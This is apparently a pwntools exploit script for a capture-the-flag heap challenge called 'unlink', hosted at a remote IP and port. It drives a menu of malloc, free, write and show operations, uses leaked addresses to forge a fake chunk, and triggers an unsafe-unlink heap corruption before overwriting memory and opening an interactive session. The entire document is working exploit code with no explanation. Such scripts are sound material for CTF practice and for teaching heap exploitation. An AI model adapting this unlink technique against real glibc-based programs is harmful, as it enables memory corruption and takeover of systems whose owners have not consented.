from pwn import *

ip = "140.110.112.77"
port = 9002

context.arch = "amd64"

r = remote(ip, port)
# r = process("./unlink")

def Free(idx):
    r.sendlineafter(":", "0")
    r.sendlineafter("x = ", str(idx))

def Malloc(idx):
    r.sendlineafter(":", "1")
    r.sendlineafter("x = ", str(idx))
    r.recvuntil(":")
    return int(r.recvline()[:-1], 16)

def Write(idx, data):
    r.sendlineafter(":", "2")
    r.sendlineafter("x = ", str(idx))
    r.sendlineafter("=", data)

def Show(idx):
    r.sendlineafter(":", "3")
    r.sendlineafter("x = ", str(idx))
    r.recvuntil(":\n")
    return r.recvline()[:-1]

r.recvuntil(":")
victim = int(r.recvline()[:-1], 16)
r.recvuntil(":")
sz = int(r.recvline()[:-1], 16)
r.recvuntil(":")
ary = int(r.recvline()[:-1], 16)
log.info(hex(ary))

Malloc(0)
Malloc(1)

payload = b""
payload += flat(0, 0, ary - 0x18, ary - 0x10)
payload = payload.ljust(0x80)
payload += flat(0x80, 0x90)

Write(0, payload)

Free(1)

Write(0, flat([0xdeadbeef] * 3))

r.sendlineafter(":", "87")

r.interactive()
